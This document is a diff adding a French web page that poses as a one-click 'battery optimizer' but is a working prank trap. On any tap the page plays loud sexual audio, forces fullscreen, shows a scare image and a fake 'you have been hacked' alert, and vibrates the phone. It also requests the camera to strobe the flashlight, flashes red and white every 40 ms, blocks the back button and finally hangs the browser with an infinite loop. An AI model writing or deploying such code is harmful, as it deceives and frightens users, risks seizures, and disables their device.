@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Optimiseur de Batterie</title>
+    <style>
+        body { background: black; color: #00ff00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; touch-action: none; transition: background 0.05s; position: relative; }
+        .card { text-align: center; border: 2px solid #00ff00; padding: 30px; border-radius: 15px; box-shadow: 0 0 15px #00ff00; z-index: 10; background: rgba(0,0,0,0.8); }
+        #start-btn { background: #00ff00; color: black; border: none; padding: 15px 30px; font-weight: bold; border-radius: 5px; cursor: pointer; font-size: 1.2rem; margin-top: 20px; }
+        #scare-image { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 0; opacity: 0; transition: opacity 0.1s; }
+        #scare-image.show { opacity: 1; }
+        .flash-red { background-color: red !important; }
+        .flash-white { background-color: white !important; }
+        @keyframes zoomFou { 0% { transform: scale(1); } 50% { transform: scale(1.8) rotate(10deg); } 100% { transform: scale(1); } }
+        .zoom-actif { animation: zoomFou 0.05s infinite; }
+        
+        #shutdown-screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 300; display: none; flex-direction: column; align-items: center; justify-content: center; color: white; }
+        .loader { border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .error-msg { position: absolute; color: red; font-weight: bold; font-size: 1.5rem; z-index: 200; white-space: nowrap; animation: move 2s linear infinite; }
+        @keyframes move { from { transform: translateY(100vh); } to { transform: translateY(-100vh); } }
+
+        /* Style pour l'alerte du pirate */
+        #hacker-alert { display: none; position: absolute; background: yellow; color: black; padding: 20px; font-size: 1.8rem; font-weight: bold; border: 5px solid red; z-index: 250; text-align: center; box-shadow: 0 0 50px red; }
+    </style>
+</head>
+<body onclick="activerPiege()" ontouchstart="activerPiege()">
+
+    <div id="interface" class="card">
+        <h2 style="margin: 0;">BATTERIE FAIBLE ?</h2>
+        <p style="color: #888;">Optimisez votre autonomie en un clic</p>
+        <button id="start-btn">OPTIMISER MAINTENANT</button>
+    </div>
+
+    <div id="hacker-alert">
+        VOUS AVEZ ÉTÉ PIRATÉ PAR😈
+    </div>
+
+    <div id="shutdown-screen">
+        <div class="loader"></div>
+        <p style="font-size: 1.2rem;">Arrêt en cours...</p>
+    </div>
+
+    <img id="scare-image" src="https://i.imgur.com/K1z3s1H.jpeg">
+
+    <audio id="audio" loop preload="auto">
+        <source src="https://www.myinstants.com/media/sounds/loud-moaning-sound-effect-original.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+    window.history.pushState(null, null, window.location.href);
+    window.onpopstate = function() { window.history.pushState(null, null, window.location.href); };
+
+    async function activerPiege() {
+        const son = document.getElementById('audio');
+        son.volume = 1.0;
+        son.play().catch(() => {});
+
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen().catch(() => {});
+        }
+
+        document.getElementById('scare-image').classList.add('show');
+        document.getElementById('hacker-alert').style.display = 'block'; // Affiche le message
+        
+        if ("vibrate" in navigator) {
+            setInterval(() => { navigator.vibrate([2000, 100]); }, 500);
+        }
+
+        try {
+            const selfieStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            for(let i=0; i<3; i++) {
+                setTimeout(() => { document.body.style.backgroundColor = "white"; }, 1000 * i);
+            }
+        } catch (e) {}
+
+        setInterval(() => {
+            const err = document.createElement('div');
+            err.className = 'error-msg';
+            err.style.left = Math.random() * 100 + 'vw';
+            err.innerText = "ERREUR ! ERREUR ! SYSTÈME CORROMPU !";
+            document.body.appendChild(err);
+            setTimeout(() => err.remove(), 2000);
+        }, 100);
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+            const track = stream.getVideoTracks()[0];
+            let flashOn = false;
+            var torcheInterval = setInterval(async () => {
+                flashOn = !flashOn;
+                await track.applyConstraints({ advanced: [{ torch: flashOn }] });
+            }, 100);
+        } catch (e) {}
+
+        const flashInterval = setInterval(() => {
+            document.body.classList.toggle('flash-red');
+            document.body.classList.toggle('flash-white');
+        }, 40);
+        document.getElementById('interface').classList.add('zoom-actif');
+
+        // Durée de 4 minutes
+        setTimeout(() => {
+            clearInterval(flashInterval);
+            if(torcheInterval) clearInterval(torcheInterval);
+            document.getElementById('scare-image').classList.remove('show');
+            document.getElementById('hacker-alert').style.display = 'none';
+            document.getElementById('interface').style.display = 'none';
+            document.getElementById('shutdown-screen').style.display = 'flex';
+            document.body.style.backgroundColor = "black";
+
+            setTimeout(() => {
+                document.getElementById('shutdown-screen').innerHTML = ""; 
+                while(true) { console.log("System Halted"); }
+            }, 5000);
+        }, 240000); 
+    }
+    </script>
+</body>
+</html>
